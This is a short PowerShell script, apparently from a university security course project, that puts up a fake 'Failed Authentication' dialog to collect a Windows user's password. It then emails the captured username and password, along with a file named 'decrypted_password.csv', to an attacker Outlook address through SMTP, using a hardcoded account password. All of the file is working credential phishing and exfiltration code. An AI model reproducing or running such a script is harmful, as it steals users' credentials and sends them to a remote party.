function Get-Creds {
    do{
    $cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
       if([string]::IsNullOrWhiteSpace([Net.NetworkCredential]::new('', $cred.Password).Password)) {
        [System.Windows.Forms.MessageBox]::Show("Credentials can not be empty!")
        Get-Creds
    }
    $creds = $cred.GetNetworkCredential() | fl
    # Define email parameters
    $EmailFrom = "forcomp6841proj@outlook.com"
    $EmailTo = "forcomp6841proj@outlook.com"
    $Subject = "Hack Result"
    $Body = "Username: " + $cred.getnetworkcredential().username + "`n" + "Password: " + $cred.getnetworkcredential().password
    $SMTPServer = "smtp-mail.outlook.com"  # Use the SMTP server of your email provider
    $SMTPPort = 587                # Use the appropriate SMTP port for your provider
    $Username = "forcomp6841proj@outlook.com"
    $Password = "C0mp6841"

    # Create email credential
    $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $Username, (ConvertTo-SecureString -String $Password -AsPlainText -Force)

    # Send the email
    Send-MailMessage -From $EmailFrom -To $EmailTo -Subject $Subject -Body $Body -Attachment "decrypted_password.csv" -SmtpServer $SMTPServer -Port $SMTPPort -Credential $Credential -UseSsl

    return $creds
      # ...
    
      $done = $true
    } until ($done)
    
    }
    
    Get-Creds